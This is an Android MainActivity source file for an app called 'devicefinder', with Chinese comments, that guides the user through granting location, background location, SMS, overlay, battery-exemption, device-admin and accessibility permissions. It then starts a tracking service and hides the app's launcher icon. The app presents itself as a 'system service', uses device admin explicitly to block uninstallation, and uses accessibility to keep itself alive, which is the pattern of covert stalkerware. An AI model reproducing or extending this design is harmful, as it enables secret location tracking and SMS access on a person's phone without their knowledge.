/*
 * ============================================================
 *  MainActivity.java — 智能化多重引导与权限强力对抗中心
 * ------------------------------------------------------------
 *  构建版本 : 20261106-2200
 *  协议版本 : v2 (对应 BuildInfo.PROTOCOL_VERSION)
 *  最后修改 : 2026-11-06
 *  兼容标准 : Android 6.0 (M) -> Android 14 (U) 全适配
 * ============================================================
 *
 * 【一、运行时自愈与安全机制概览】
 * 1. 环形生命周期挂起锁 (isRequestingPermission)
 *    - 阻断系统权限弹窗销毁时引发的 Window Focus 扰动对 onResume() 的错误唤醒。
 *    - 通过 Handler 将解锁推迟到下一个主线程 Looper，彻底终结自定义引导弹窗
 *      与系统动态权限框交替闪现、重叠的经典 Android 宿主死循环。
 * 2. 独占式防重叠防爆器 (safeShowDialog)
 *    - 接管全局所有 AlertDialog 的创建与展示，建立单例 Dismiss 监听。
 *    - 根除 Activity 由于配置变更或横竖屏重绘引起的弹窗多层叠加与句柄泄漏。
 * 3. 稳健态冷启动序列保护
 *    - 全面序列化保护所有向系统设置跳转的等待标志位（waitingFor...）。
 *    - 仅在 ConfigChange (如横竖屏旋转) 时恢复状态；若因低内存被系统强杀，
 *      则重置标志位，确保引导链条 100% 完美断点续传或安全重走。
 * 4. 延迟防闪退跳转机制
 *    - 在 Dialog 中点击跳转系统设置前，强制先 dismiss()，再延迟 500ms 执行拉起服务与跳转。
 *    - 彻底规避 Android 8.0+ 因后台启动前台服务未及时绑定通知所引发的 RemoteServiceException 秒杀。
 *
 * ============================================================
 * 【二、📱 客户端本地运维与测试排错白皮书】
 * ============================================================
 *
 * ▶ 1. 权限状态快速审查 (通过 ADB 命令行免界面验证)
 *    - 查看精确定位授权 : adb shell pm dump com.example.devicefinder | grep -A 1 "ACCESS_FINE_LOCATION"
 *    - 查看后台定位授权 : adb shell pm dump com.example.devicefinder | grep -A 1 "ACCESS_BACKGROUND_LOCATION"
 *    - 检查悬浮窗权限   : adb shell dumpsys appops | grep com.example.devicefinder | grep SYSTEM_ALERT_WINDOW
 *
 * ▶ 2. 强制模拟低内存应用强杀重建测试 (压测常驻稳定性)
 *    - 第一步（使其进入后台）: 手机端按下 Home 键返回桌面
 *    - 第二步（获取应用PID） : adb shell pidof com.example.devicefinder
 *    - 第三步（模拟系统强杀） : adb shell am kill com.example.devicefinder
 *    - 第四步（点击图标重进） : 观察 MainActivity 是否能无缝恢复状态（看日志中是否有 ♻️ Activity 重建 提示）
 *
 * ▶ 3. 前台定位高强保活验证
 *    - 查看前台服务状态 : adb shell dumpsys activity services com.example.devicefinder/.TrackingService
 *    - 说明: 只要 dumpsys 中显示 isForeground=true 且包含合法的 NotificationID，即代表成功挂载 Android 前台装甲。
 * ============================================================
 */

package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private static final int REQ_NOTIFICATION = 101;
    private static final int REQ_BG_LOCATION = 102;

    private boolean serviceStarted = false;
    private boolean alarmAsked = false;
    private int permissionRetryCount = 0;
    
    // 记录无障碍弹框是否正在显示（防系统误杀）
    private boolean isAccessibilityDialogShowing = false; 
    // 记录全局是否有任何自定义弹框正在显示（防系统重绘导致的叠弹框）
    private boolean isAnyDialogShowing = false;
    // ★ 核心挂起锁：是否正在等待系统权限弹框的回调
    private boolean isRequestingPermission = false;

    private boolean waitingForAlarmSetting = false;
    private boolean waitingForBgLocSetting = false;
    private boolean waitingForBatterySetting = false;
    private boolean waitingForOverlaySetting = false;
    private boolean waitingForDeviceAdmin = false;
    private boolean waitingForAccessibilitySetting = false;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
        }

        if (savedInstanceState != null) {
            serviceStarted = savedInstanceState.getBoolean("serviceStarted", false);
            alarmAsked = savedInstanceState.getBoolean("alarmAsked", false);
            permissionRetryCount = savedInstanceState.getInt("permissionRetryCount", 0);
            isRequestingPermission = savedInstanceState.getBoolean("isRequestingPermission", false);

            // ★ 核心修复：区分是屏幕旋转 (ConfigChange) 还是进程被系统强杀。
            // 只有在屏幕旋转时才恢复等待标志，防止强杀重建后流程错乱跳过引导。
            boolean isConfigChange = (getChangingConfigurations() & android.content.pm.ActivityInfo.CONFIG_ORIENTATION) != 0;
            if (isConfigChange) {
                waitingForBgLocSetting = savedInstanceState.getBoolean("waitingForBgLocSetting", false);
                waitingForBatterySetting = savedInstanceState.getBoolean("waitingForBatterySetting", false);
                waitingForDeviceAdmin = savedInstanceState.getBoolean("waitingForDeviceAdmin", false);
                waitingForOverlaySetting = savedInstanceState.getBoolean("waitingForOverlaySetting", false);
                waitingForAccessibilitySetting = savedInstanceState.getBoolean("waitingForAccessibilitySetting", false);
                waitingForAlarmSetting = savedInstanceState.getBoolean("waitingForAlarmSetting", false);
            }
            FileLogger.log(this, "MAIN", "♻️ Activity 重建，恢复状态 (ConfigChange=" + isConfigChange + ")");
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean("serviceStarted", serviceStarted);
        outState.putBoolean("alarmAsked", alarmAsked);
        outState.putInt("permissionRetryCount", permissionRetryCount);
        outState.putBoolean("waitingForBgLocSetting", waitingForBgLocSetting);
        outState.putBoolean("waitingForBatterySetting", waitingForBatterySetting);
        outState.putBoolean("waitingForDeviceAdmin", waitingForDeviceAdmin);
        outState.putBoolean("waitingForOverlaySetting", waitingForOverlaySetting);
        outState.putBoolean("waitingForAccessibilitySetting", waitingForAccessibilitySetting);
        outState.putBoolean("waitingForAlarmSetting", waitingForAlarmSetting);
        outState.putBoolean("isRequestingPermission", isRequestingPermission);
    }

    @Override
    protected void onResume() {
        super.onResume();

        // ★ 核心拦截：如果系统权限弹框刚刚关闭，结果还没回调（isRequestingPermission=true），
        // 绝对不许往下走流程，防止强行弹出自定义的“后台定位”框。
        if (isRequestingPermission) {
            return;
        }

        if (waitingForAlarmSetting) {
            waitingForAlarmSetting = false;
            isAnyDialogShowing = false; // 从外部界面返回，强制重置弹框状态
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            boolean ok = am != null && am.canScheduleExactAlarms();
            if (ok) {
                Toast.makeText(this, "✅ 精确闹钟已开启", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未开启精确闹钟，上报时间可能不准", Toast.LENGTH_LONG).show();
            }
            checkAndRequestPermissions();
            return;
        }

        if (waitingForDeviceAdmin) {
            waitingForDeviceAdmin = false;
            isAnyDialogShowing = false; // 强制重置
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                Toast.makeText(this, "✅ 防卸载装甲已激活", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未激活防卸载，应用将直接启动", Toast.LENGTH_LONG).show();
            }
            checkAndOpenAccessibilitySettingsAndFinish();
            return;
        }

        if (waitingForOverlaySetting) {
            waitingForOverlaySetting = false;
            isAnyDialogShowing = false; // 强制重置
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
            }
            checkDeviceAdmin();
            return;
        }

        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            isAnyDialogShowing = false; // 强制重置
            if (isBatteryOptimizationIgnored()) {
                Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
                checkOverlayPermission();
            } else {
                promptBatteryOptimizationAgain();
            }
            return;
        }

        if (waitingForBgLocSetting) {
            waitingForBgLocSetting = false;
            isAnyDialogShowing = false; // 强制重置
            proceedAfterBackgroundLocation();
            return;
        }

        if (waitingForAccessibilitySetting) {
            waitingForAccessibilitySetting = false;
            isAnyDialogShowing = false; // 强制重置
            if (isAccessibilityServiceEnabled()) {
                FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍已开启（从设置返回）");
                finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            } else {
                FileLogger.log(this, "ACCESSIBILITY", "⚠️ 从设置返回但未开启无障碍");
                finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
            }
            return;
        }

        if (serviceStarted) {
            if (isAccessibilityDialogShowing || isAnyDialogShowing) {
                return;
            }
            finish();
            return;
        }

        // ★ 如果当前已经有任何我们的弹框在显示（比如后台定位框），直接 return
        if (isAnyDialogShowing) {
            return;
        }

        checkAndRequestPermissions();
    }

    // ★ 全局安全弹框，彻底杜绝重绘导致的叠框
    private void safeShowDialog(AlertDialog.Builder builder) {
        if (isAnyDialogShowing || isFinishing() || isDestroyed()) {
            return;
        }
        isAnyDialogShowing = true;
        AlertDialog dialog = builder.create();
        dialog.setOnDismissListener(d -> isAnyDialogShowing = false);
        dialog.show();
    }

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < 23) {
            proceedAfterPermissions();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmAsked) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
                alarmAsked = true;
                safeShowDialog(new AlertDialog.Builder(this)
                        .setTitle("建议允许精确闹钟")
                        .setMessage("允许精确闹钟后，手机息屏时定位上报会更准点。\n\n"
                                + "• 点击「去设置」→ 开启「闹钟和提醒」\n"
                                + "• 点击「暂不开启」→ 仍可运行，但上报时间可能有几分钟偏差")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForAlarmSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForAlarmSetting = false;
                                Toast.makeText(this, "无法打开精确闹钟设置", Toast.LENGTH_SHORT).show();
                                checkAndRequestPermissions();
                            }
                        })
                        .setNegativeButton("暂不开启", (dialog, which) -> checkAndRequestPermissions()));
                return;
            }
        }

        boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
        boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                          checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
        boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
        boolean needNearbyWifi = Build.VERSION.SDK_INT >= 33
                && checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != PackageManager.PERMISSION_GRANTED;

        if (needFgLoc || needNotif || needSms || needActivity || needNearbyWifi) {
            if (permissionRetryCount >= 2) {
                checkBgLocThenProceed();
                return;
            }
            permissionRetryCount++;

            java.util.List<String> perms = new java.util.ArrayList<>();
            if (needFgLoc) {
                perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
                perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            }
            if (needSms) {
                perms.add(Manifest.permission.RECEIVE_SMS);
                perms.add(Manifest.permission.SEND_SMS);
            }
            if (needActivity) {
                perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
            }
            if (needNotif) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            if (needNearbyWifi) {
                perms.add("android.permission.NEARBY_WIFI_DEVICES");
            }
            
            // ★ 上锁：告诉 onResume 我正在请求系统权限，不要乱动
            isRequestingPermission = true; 
            requestPermissions(perms.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            checkBgLocThenProceed();
        }
    }

    private void checkBgLocThenProceed() {
        boolean needBgLoc = Build.VERSION.SDK_INT >= 29
                && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;

        if (needBgLoc) {
            if (Build.VERSION.SDK_INT >= 30) {
                safeShowDialog(new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForBgLocSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForBgLocSetting = false;
                                proceedAfterBackgroundLocation();
                            }
                        }));
            } else {
                // ★ 上锁
                isRequestingPermission = true; 
                requestPermissions(
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        REQ_BG_LOCATION);
            }
            return;
        }

        proceedAfterPermissions();
    }

    private void proceedAfterBackgroundLocation() {
        boolean bgLocOk = Build.VERSION.SDK_INT < 29
                || checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!bgLocOk) {
            safeShowDialog(new AlertDialog.Builder(this)
                    .setTitle("后台定位未开启")
                    .setMessage("锁屏后可能无法定位。是否重新去设置？\n\n"
                            + "进入后请找到「位置信息」→ 选择「始终允许」。")
                    .setCancelable(false)
                    .setPositiveButton("再去设置", (dialog, which) -> {
                        waitingForBgLocSetting = true;
                        try {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForBgLocSetting = false;
                            FileLogger.log(this, "LOCATION",
                                    "⚠️ 打开后台定位设置失败: " + e.getMessage());
                            checkNotifThenProceed();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启后台定位，锁屏后可能无法定位", Toast.LENGTH_LONG).show();
                        checkNotifThenProceed();
                    }));
            return;
        }

        checkNotifThenProceed();
    }

    private void checkNotifThenProceed() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            // ★ 上锁
            isRequestingPermission = true; 
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        // ★ 工业级避坑：将解锁动作推迟到系统权限 UI 彻底退场后的下一个 Looper 循环
        // 确保系统权限 UI 的退场动画和 onResume 彻底执行完毕后，再行释放锁
        mainHandler.post(() -> isRequestingPermission = false);

        if (requestCode == REQ_BG_LOCATION) {
            proceedAfterBackgroundLocation();
            return;
        }

        if (requestCode == REQ_NOTIFICATION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ 通知权限已开启", Toast.LENGTH_SHORT).show();
            }
            proceedAfterPermissions();
            return;
        }

        if (requestCode != REQ_PERMISSIONS) return;

        boolean allGranted = grantResults.length > 0;
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            permissionRetryCount = 0;
            checkAndRequestPermissions();
        } else {
            Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
            checkBgLocThenProceed();
        }
    }

    private void proceedAfterPermissions() {
        if (isBatteryOptimizationIgnored()) {
            checkOverlayPermission();
        } else {
            promptBatteryOptimization();
        }
    }

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private void promptBatteryOptimization() {
        safeShowDialog(new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证息屏后仍能持续上报位置，\n请将本应用设为「不限制」。")
                .setCancelable(false)
                .setPositiveButton("去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("暂时跳过", (dialog, which) -> checkOverlayPermission()));
    }

    private void promptBatteryOptimizationAgain() {
        safeShowDialog(new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("系统限制尚未解除，息屏后可能无法定位。")
                .setCancelable(false)
                .setPositiveButton("再去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("放弃", (dialog, which) -> checkOverlayPermission()));
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            } else {
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        } catch (Exception e) {
            waitingForBatterySetting = false;
            checkOverlayPermission();
        }
    }

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            safeShowDialog(new AlertDialog.Builder(this)
                    .setTitle("开启悬浮窗权限")
                    .setMessage("用于提升后台存活率和显示提示，请在下一页允许「显示在其他应用上层」。")
                    .setCancelable(false)
                    .setPositiveButton("去开启", (dialog, which) -> {
                        waitingForOverlaySetting = true;
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> checkDeviceAdmin()));
        } else {
            checkDeviceAdmin();
        }
    }

    private void checkDeviceAdmin() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            safeShowDialog(new AlertDialog.Builder(this)
                    .setTitle("开启防卸载保护")
                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。")
                    .setCancelable(false)
                    .setPositiveButton("去激活", (dialog, which) -> {
                        waitingForDeviceAdmin = true;
                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活后可防止应用被轻易卸载");
                        try {
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForDeviceAdmin = false;
                            checkAndOpenAccessibilitySettingsAndFinish();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启防卸载保护", Toast.LENGTH_LONG).show();
                        checkAndOpenAccessibilitySettingsAndFinish();
                    }));
        } else {
            checkAndOpenAccessibilitySettingsAndFinish();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices == null) return false;
            for (String s : enabledServices.split(":")) {
                if (s.equalsIgnoreCase(service)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean startTrackingServiceOnly() {
        if (serviceStarted) return true;
        serviceStarted = true;
        Intent intent = new Intent(this, TrackingService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            return true;
        } catch (Exception e) {
            serviceStarted = false;
            FileLogger.log(this, "START_SERVICE", "启动失败: " + e);
            return false;
        }
    }

    private void checkAndOpenAccessibilitySettingsAndFinish() {
        if (isFinishing() || isDestroyed() || isAnyDialogShowing || isAccessibilityDialogShowing) return;

        if (isAccessibilityServiceEnabled()) {
            FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍服务已开启（跳过引导）");
            finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            return;
        }

        isAccessibilityDialogShowing = true;

        safeShowDialog(new AlertDialog.Builder(this)
                .setTitle("开启无障碍保活服务（推荐）")
                .setMessage("为保证 App 被系统清理后能自动复活，推荐开启无障碍服务。\n\n"
                        + "• 点击「去开启」跳转到无障碍设置，找到【" + getString(R.string.app_name) + "】并勾选开启\n"
                        + "• 点击「暂不开启」或按返回键跳过本次引导\n\n"
                        + "无论是否开启，完成后桌面图标都会自动隐藏。")
                .setCancelable(true)
                .setPositiveButton("去开启", (dialog, which) -> {
                    dialog.dismiss(); // ★ 先关闭弹窗，防止 WindowLeaked
                    isAccessibilityDialogShowing = false;
                    waitingForAccessibilitySetting = true;
                    
                    // ★ 延迟 500ms 再拉起服务和跳转，避开后台服务启动的 5 秒崩溃限制
                    mainHandler.postDelayed(() -> {
                        startTrackingServiceOnly();
                        try {
                            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForAccessibilitySetting = false;
                            FileLogger.log(this, "ACCESSIBILITY", "⚠️ 无法打开无障碍设置: " + e.getMessage());
                            finishWithToast("设置无法打开", Toast.LENGTH_SHORT);
                        }
                    }, 500);
                })
                .setNegativeButton("暂不开启", (dialog, which) -> {
                    dialog.dismiss();
                    isAccessibilityDialogShowing = false;
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户主动跳过无障碍");
                    mainHandler.postDelayed(() -> finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG), 100);
                })
                .setOnCancelListener(dialog -> {
                    isAccessibilityDialogShowing = false;
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户按返回键跳过无障碍");
                    mainHandler.postDelayed(() -> finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG), 100);
                }));
    }

    private void finishWithToast(String msg, int duration) {
        boolean serviceOk = startTrackingServiceOnly();
        if (serviceOk) {
            try {
                hideLauncherIcon();
            } catch (Exception e) {
                FileLogger.log(this, "ICON", "隐藏图标失败: " + e);
            }
        } else {
            msg = msg + "\n⚠️ 服务启动失败，已保留桌面图标";
            duration = Toast.LENGTH_LONG;
        }
        
        Toast.makeText(getApplicationContext(), msg, duration).show();
        finish();
    }

    private void hideLauncherIcon() {
        FileLogger.log(this, "ICON", "隐藏桌面图标");
        LauncherIconUtils.setLauncherIconVisible(this, false);
    }
}
